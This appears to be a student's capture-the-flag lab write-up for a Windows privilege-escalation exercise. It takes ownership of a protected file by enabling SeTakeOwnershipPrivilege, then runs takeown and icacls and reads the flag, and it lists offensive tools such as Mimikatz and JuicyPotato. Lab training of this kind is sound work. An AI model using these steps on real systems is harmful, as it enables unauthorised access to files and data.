[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.

Run this script for enabling this privilege.

```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Scenario: we have a foothold in the system.
Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.


run 
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

```


run this in PS to find tyhe owner for the file.

```
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

we have to enable the SeTakeOwnershipPrivilege.

```
PS C:\TakeOwn> cd c:\tools
PS C:\tools> ls


    Directory: C:\tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2021   1:37 PM                AccessChk
d-----        3/31/2021   3:05 PM                Mimikatz
d-----        4/16/2021   1:39 PM                PipeList
d-----        3/31/2021   3:27 PM                Procdump
d-----        5/12/2021  11:08 AM                RoguePotato
d-----        3/31/2021   3:11 PM                winPEAS
-a----        3/25/2021   2:57 PM         759176 accesschk64.exe
-a----        4/19/2021   1:57 PM           4554 Enable-Privilege.ps1
-a----        4/19/2021   2:00 PM           3449 EnableAllTokenPrivs.ps1
-a----        5/27/2021   4:36 PM         471840 hhupd.exe
-a----        3/31/2021   3:14 PM          16974 jaws-enum.ps1
-a----        5/12/2021  10:17 AM        3007673 JuicyPotato.exe
-a----        3/31/2021   3:16 PM        6635326 lazagne.exe
-a----        5/12/2021  10:34 AM          38616 nc.exe
-a----        3/31/2021   3:20 PM          13975 PowerDump.ps1
-a----        3/31/2021   3:12 PM         600580 PowerUp.ps1
-a----        5/12/2021  11:58 AM          27136 PrintSpoofer.exe
-a----        3/31/2021   3:07 PM         731136 SafetyKatz.exe
-a----        3/31/2021   3:07 PM         544256 Seatbelt.exe
-a----        3/31/2021   3:15 PM          39492 SessionGopher.ps1
-a----        5/26/2021  11:54 AM         739328 SharpChrome.exe
-a----        3/31/2021   3:07 PM           8704 SharpDump.exe
-a----        3/31/2021   3:07 PM          26112 SharpUp.exe
-a----        3/25/2021   8:22 AM          27136 Watson.exe


PS C:\tools> Import-Module .\Enable-Privilege.ps1
```

check the privilege once again.

```
PS C:\tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
PS C:\tools>

```
now we can see that we have enabled the SeTakeOwnershipPrivilege.

change the ownership.

```
PS C:\takeown> takeown /f 'flag.txt'

SUCCESS: The file (or folder): "C:\takeown\flag.txt" now owned by user "WINLPE-SRV01\htb-student".

check the ownership of the file 


PS C:\takeown> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expre
ssion={ (Get-Acl $_.FullName).Owner }}

FullName            LastWriteTime        Attributes Owner
--------            -------------        ---------- -----
C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive WINLPE-SRV01\htb-student

```

Let's grant our user full privileges over the target file.

```
PS C:\takeown> icacls 'flag.txt'/grant htb-student:F
processed file: flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\takeown> cat flag.txt

```
successfully grabbed the flag by escalating, the priv.